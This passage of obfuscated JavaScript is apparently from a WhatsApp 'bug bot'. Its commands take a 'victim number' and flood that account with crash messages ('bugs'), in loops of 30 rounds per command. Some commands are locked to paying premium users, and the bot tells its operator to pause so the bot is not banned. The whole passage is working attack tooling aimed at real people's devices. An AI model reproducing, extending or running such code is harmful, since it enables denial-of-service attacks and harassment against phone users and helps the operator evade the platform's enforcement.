            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x309853 = _0x1b3c99.split(',')[0x0];
          let _0x1464a4 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x309853 || !_0x1464a4) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x1464a4))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x217787 = _0x309853.replace(/[^0-9]/g, '');
          let _0x4df3ba = '' + encodeURI(_0x1464a4);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x217787 + "@s.whatsapp.net");
          let _0x3823a8 = _0x217787 + "@s.whatsapp.net";
          if (_0x217787 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3823a8, _0x4df3ba);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3823a8.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3823a8]);
        }
        break;
      case '🗿':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x465bba = q.replace(/[^0-9]/g, '');
          if (_0x465bba.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3d60fb = _0x465bba + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x1315dc = 0x0; _0x1315dc < 0x1e; _0x1315dc++) {
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x28a511(_0x3d60fb);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x28a511(_0x3d60fb);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x28a511(_0x3d60fb);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4de787(_0x3d60fb, _0x600e6e);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4de787(_0x3d60fb, _0x600e6e);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
            await _0x156efb(_0x3d60fb, _0x3facec);
            await _0x4de787(_0x3d60fb, _0x600e6e);
            await _0x4b4561(_0x3d60fb, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x465bba + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case '🤯':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1a6d03 = q.replace(/[^0-9]/g, '');
          if (_0x1a6d03.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x97c631 = _0x1a6d03 + '@s.whatsapp.net';
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x4de17f = 0x0; _0x4de17f < 0x1e; _0x4de17f++) {
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x28a511(_0x97c631);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x28a511(_0x97c631);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x28a511(_0x97c631);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4de787(_0x97c631, _0x600e6e);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4de787(_0x97c631, _0x600e6e);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4b4561(_0x97c631, _0x600e6e);
            await _0x156efb(_0x97c631, _0x3facec);
            await _0x4de787(_0x97c631, _0x600e6e);
            await _0x4b4561(_0x97c631, _0x600e6e);
          }
          await _0x5d98d9("彡 Successfully Send Bug to " + _0x1a6d03 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 3 minutes so that the bot is not banned.");
        }
        break;
      case "hentai-blank":
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.only.premium);
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x45a0bd = q.replace(/[^0-9]/g, '');
          if (_0x45a0bd.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x47a06c = _0x45a0bd + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x3116d1 = 0x0; _0x3116d1 < 0x1e; _0x3116d1++) {
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
            await _0x4b4561(_0x47a06c, _0x600e6e);
            await _0x4de787(_0x47a06c, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x45a0bd + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "japan":
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.only.premium);
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x47d954 = q.replace(/[^0-9]/g, '');
          if (_0x47d954.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x589b85 = _0x47d954 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x310b5c = 0x0; _0x310b5c < 0x1e; _0x310b5c++) {
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
            await _0x4b4561(_0x589b85, _0x600e6e);
            await _0x4de787(_0x589b85, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x47d954 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "yandex":
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.only.premium);
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x498a54 = q.replace(/[^0-9]/g, '');
          if (_0x498a54.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x45f508 = _0x498a54 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x337565 = 0x0; _0x337565 < 0x1e; _0x337565++) {
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
            await _0x4b4561(_0x45f508, _0x600e6e);
            await _0x4de787(_0x45f508, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x498a54 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'hentai':
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.only.premium);
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3ec52a = q.replace(/[^0-9]/g, '');
          if (_0x3ec52a.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5cfeeb = _0x3ec52a + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x315907 = 0x0; _0x315907 < 0x1e; _0x315907++) {
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
            await _0x4b4561(_0x5cfeeb, _0x600e6e);
            await _0x4de787(_0x5cfeeb, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x3ec52a + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "brazzers":
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.only.premium);
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5dd957 = q.replace(/[^0-9]/g, '');
          if (_0x5dd957.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x3293d2 = _0x5dd957 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x4f70ee = 0x0; _0x4f70ee < 0x1e; _0x4f70ee++) {
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
            await _0x4b4561(_0x3293d2, _0x600e6e);
            await _0x4de787(_0x3293d2, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x5dd957 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "xnxx":
        {
          if (!_0x210452) {
            return _0x5d98d9(mess.only.premium);
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x2cb516 = q.replace(/[^0-9]/g, '');
          if (_0x2cb516.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x14c176 = _0x2cb516 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x13c598 = 0x0; _0x13c598 < 0x1e; _0x13c598++) {
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
            await _0x4b4561(_0x14c176, _0x600e6e);
            await _0x4de787(_0x14c176, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x2cb516 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'hardcore-maker':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x5a76c0 = _0x1b3c99.split(',')[0x0];
          let _0x537510 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x5a76c0 || !_0x537510) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x537510))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x2efe1c = _0x5a76c0.replace(/[^0-9]/g, '');
          let _0x248c61 = '' + encodeURI(_0x537510);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x2efe1c + "@s.whatsapp.net");
          let _0x10f01d = _0x2efe1c + "@s.whatsapp.net";
          if (_0x2efe1c == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x10f01d, _0x248c61);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x10f01d.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x10f01d]);
        }
        break;
      case "hardcore-lcd":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x28b9ad = _0x1b3c99.split(',')[0x0];
          let _0x8aed85 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x28b9ad || !_0x8aed85) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x8aed85))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x854e08 = _0x28b9ad.replace(/[^0-9]/g, '');
          let _0x3c3f99 = '' + encodeURI(_0x8aed85);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x854e08 + "@s.whatsapp.net");
          let _0x3367db = _0x854e08 + "@s.whatsapp.net";
          if (_0x854e08 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3367db, _0x3c3f99);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3367db.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3367db]);
        }
        break;
      case "hardcore-dark":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x40299f = _0x1b3c99.split(',')[0x0];
          let _0x18e103 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x40299f || !_0x18e103) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x18e103))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x2b985c = _0x40299f.replace(/[^0-9]/g, '');
          let _0x126eca = '' + encodeURI(_0x18e103);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x2b985c + '@s.whatsapp.net');
          let _0x5e6ae9 = _0x2b985c + "@s.whatsapp.net";
          if (_0x2b985c == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x5e6ae9, _0x126eca);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x5e6ae9.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x5e6ae9]);
        }
        break;
      case 'hardcore-cover':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
